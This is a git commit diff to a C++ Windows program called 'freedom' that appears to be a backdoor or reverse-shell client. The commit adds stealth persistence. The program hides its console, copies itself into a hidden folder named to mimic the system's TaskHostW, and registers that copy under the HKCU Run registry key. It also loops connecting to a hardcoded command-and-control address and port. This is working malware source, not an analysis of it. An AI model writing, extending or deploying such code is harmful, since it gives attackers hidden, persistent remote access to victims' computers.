058aa9242ed16d63743da5b3f62d4cd266230ac0
Dima <dimaac@bk.ru>
2025-05-10 18:38:22 +0200

    Added startup, self management

--- freedom/main.cpp
+++ freedom/main.cpp
@@ -1,4 +1,5 @@
 #include <ws2tcpip.h>
+#include <windows.h>
 #include <string.h>
 #include <stdio.h>
 #include <winsock2.h>
@@ -9,15 +10,45 @@ using namespace std;
 
 #pragma comment(lib, "Ws2_32.lib")
 
-char  i[14] = { '1' , '7' , '2' , '.' , '2' , '9' , '.','2','2','6','.','1','7','2' };
+// t.me/afterpeice
 
-#define p "8888"
+std::string commander = "172.29.226.172";
+std::string street = "1991";
+
+void AddToStartup(const std::string& fullPath) {
+    HKEY hKey;
+    const char* czStartName = "MyStartupApp";
+
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+
+        RegSetValueExA(hKey, czStartName, 0, REG_SZ, (BYTE*)fullPath.c_str(), fullPath.length());
+        RegCloseKey(hKey);
+    }
+}
+
+void InitSelf() { // initialisation management of itself
+    char originalPath[MAX_PATH];
+    GetModuleFileNameA(NULL, originalPath, MAX_PATH);
+
+    std::string targetDir = "C:\\Users\\dimad\\AppData\\Local\\TaskHostW";
+    std::string targetPath = targetDir + "\\freedom.exe";
+
+    CreateDirectoryA(targetDir.c_str(), NULL);
+    SetFileAttributesA(targetDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
+    CopyFileA(originalPath, targetPath.c_str(), FALSE);
+    
+    AddToStartup(targetPath);
+}
 
 int main(int argc, char* argv[])
 {
+    InitSelf();
     FreeConsole();
 
     WSADATA wsaData;
+    SOCKET ConnectSocket;
     int  programme = WSAStartup(MAKEWORD(2, 2), &wsaData);
     struct addrinfo* out = NULL, * ptr = NULL, hints;
     memset(&hints, 0, sizeof(hints));
@@ -25,15 +56,12 @@ int main(int argc, char* argv[])
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    SOCKET ConnectSocket;
-
     while (true) {
-        getaddrinfo(i, p, &hints, &out);
+        getaddrinfo(commander.c_str(), street.c_str(), &hints, &out);
         ptr = out;
         ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
 
         if (connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
-
             Sleep(5000);
             continue;
         }
@@ -56,6 +84,6 @@ int main(int argc, char* argv[])
 
         closesocket(ConnectSocket);
     }
-
+    
     WSACleanup();
 }
